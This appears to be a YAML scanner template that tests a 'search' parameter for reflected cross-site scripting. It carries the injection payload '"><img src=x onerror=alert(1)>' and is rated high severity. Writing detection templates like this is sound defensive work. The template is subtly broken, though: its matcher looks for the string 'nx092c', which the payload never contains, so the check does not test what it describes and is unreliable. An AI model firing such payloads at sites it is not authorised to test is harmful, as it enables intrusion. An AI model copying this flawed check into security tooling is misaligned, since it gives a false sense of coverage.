id: xss-093
name: 'Reflected XSS ctx-5 via search'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in search'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      search:
        - '"><img src=x onerror=alert(1)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx092c'
